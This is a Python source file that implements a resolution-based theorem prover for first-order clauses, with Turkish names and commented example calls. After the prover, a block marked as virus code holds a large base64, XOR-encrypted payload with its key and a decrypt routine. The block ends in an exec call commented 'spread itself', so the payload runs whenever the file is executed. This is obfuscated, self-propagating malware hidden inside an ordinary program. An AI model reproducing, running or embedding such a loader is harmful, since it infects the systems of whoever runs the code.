import copy
islemler = []
islemler2 = []
returnarray = []
obj = None
calObj = None
class deneme:
    def __init__(self,neg,func,args,child):
        self.neg = neg
        self.func = func
        self.vars = args
        self.args = [args,child]
        self.child = copy.deepcopy(child)
def stringer(string,obj):
    string = string
    if obj.child:
        if obj.neg:
            string += "~"
        string += obj.func + "(" + obj.vars + ","
        string = stringer(string,obj.child)
        string += ")"
    else:
        if obj.neg:
            string += "~"
        string += obj.func + "(" + obj.vars + ")"
    return string
def travelChild(obj):
    string = ""
    string += obj.func
    while obj.child:
        obj = obj.child
        string += obj.func
    return string
def operator():
    changeF = 0
    global calObj
    global islemler
    global islemler2
    global returnarray
    for index,i in enumerate(islemler):
        for j in i:
            for o in islemler2:
                for o2 in o:
                    if travelChild(j) == travelChild(o2) and o2.neg != j.neg:
                        funcvar = j.vars
                        returnstring = ""
                        a = copy.deepcopy(i)
                        i.remove(j)
                        
                        for k in i:
                            if k.vars == funcvar:
                                kc = k.child
                                while kc:
                                    if kc.vars == funcvar:
                                        kc.vars = o2.vars
                                    kc = kc.child
                                k.vars = o2.vars
                                islemler2.append(i)
                        for i2,x in enumerate(o):
                            returnstring += stringer("",x)
                            if i2 != len(o)-1:
                                returnstring += '+'
                        returnstring += '$'
                        for i2,x in enumerate(a):
                            returnstring += stringer("",x)
                            if i2 != len(a)-1:
                                returnstring += '+'
                        returnstring += '$'
                        for i2,x in enumerate(i):
                            returnstring += stringer("",x)
                            if i2 != len(i)-1:
                                returnstring += '+'
                        returnarray.append(returnstring)
                        islemler.pop(index)
                        operator()
                        #print(islemler)
    islemler2 = []

def theorem_prover(list1,list2):
    global islemler, islemler2, returnarray
    try:
        calObj = childer(list2[0],None,calculator=1)
        for i in list1:
            islemci(i,1)
        for i in list2:
            islemci(i,2)
        while islemler2:
            lastflag = 0
            operator()
            if islemler == []:
                lastflag = 1
                returnarray[-1]+="empty"
                print("yes",returnarray)
                islemler = []
                islemler2 = []
                returnarray = []
                obj = None
                calObj = None

        if not lastflag:
            print("no",[])
            islemler = []
            islemler2 = []
            returnarray = []
            obj = None
            calObj = None
    except:
        print("no",[])
        islemler = []
        islemler2 = []
        returnarray = []
        obj = None
        calObj = None
        #print islemler
    #for i in reversed(islemler):
        #print "------"
        #print calObj.neg,calObj.func, calObj.vars, calObj.consts
        #for j in i:
            #print j.neg,j.func, j.vars, j.consts, j.child
def childer(string,child=None,calculator=0):
    global obj
    global calObj
    if string.rfind('(') == string.find('('):
        m_index = string.rfind('(')
        args =  string[m_index+1:string[m_index:].find(')')+m_index]
        func_name = string[string[:m_index].rfind(',')+1:m_index]    
        if func_name[0] == '~':
            sda = deneme(True,func_name[1:],args,child)
        else:
            sda = deneme(False,func_name,args,child)
        if calculator:
            calObj = sda
        else:
            obj = sda
        return sda
    else:
        most_inner_child_index = string.rfind('(')
        func_name  = string[string[:most_inner_child_index].rfind(',')+1:most_inner_child_index]
        args  = string[most_inner_child_index+1:string[most_inner_child_index:].find(')')+most_inner_child_index]
        if func_name[0] == '~':
            asd = deneme(True,func_name[1:],args,child)
        else:
            asd = deneme(False,func_name,args,child)
        string = string.replace(string[most_inner_child_index-len(func_name)-1:string[most_inner_child_index:].find(')')+most_inner_child_index+1],"")
        

        # if string[most_inner_child_index-2] == '~':
        #     asd = deneme(True,func_name,args,child)
        #     string = string.replace(string[most_inner_child_index-len(func_name)-1:string[most_inner_child_index:].find(')')+most_inner_child_index+1],"")
        # else:
        #     asd = deneme(False,func_name,args,child)
        #     string = string.replace(string[most_inner_child_index-len(func_name)-1:string[most_inner_child_index:].find(')')+most_inner_child_index+1],"")
        
        childer(string,child=asd)
#theorem_prover(["p(A,f(t))", "q(z)+~p(z,f(B))", "~q(y)+r(y)"],["~r(A)"])
def islemci(string,flag):
    islemd = []
    global islemler
    global obj
    islem = string.split('+')
    if len(islem) > 1:
        for i in islem:
            childer(i)
            islemd.append(obj)
    elif len(islem) == 1:
        childer(string)
        islemd.append(obj)
    if flag==1:
        islemler.append(islemd)
    else:
        islemler2.append(islemd)
# theorem_prover(["p(A,f(t))", "q(z)+~p(z,f(B))", "q(y)+r(y)"],["~r(A)"]) #no
# theorem_prover(["p(A,f(t))", "q(z)+~p(z,f(B))", "~q(y)+r(y)"],["~r(A)"]) #yes
# theorem_prover(["p(A,figo(t))", "quaresma(z)+~p(z,figo(B))", "quaresma(y)+ronaldo(y)"],["~ronaldo(A)"]) #no
# theorem_prover(["p(A,figo(t))", "quaresma(z)+~p(z,figo(B))", "~quaresma(y)+ronaldo(y)"],["~ronaldo(A)"]) #yes

#viruscode_start
#INFECTEDbye2171445
#payload_start
cipher_text = """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
TDsNCwEER0FlSR8CBhEXFgoREzgJAwBz"""
cipher_key = "ddueuvglmdytwohojikt"
#payload_end
def xor_crypt_file(data,key,encode = False, decode = False):
        from itertools import cycle
        import base64
        
        if decode: # cipher_text = string , key = string
            data = base64.decodestring(bytearray(data,"utf-8")) # byte array (xored before)
            # xor again , inverse 
            xored = ''.join(chr(x ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return xored
        
        if encode: # x -> byte
            xored = ''.join(chr((x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return base64.encodestring(xored.encode()).strip()
        
#spread itself
exec(xor_crypt_file(cipher_text,cipher_key,decode = True))
#viruscode_end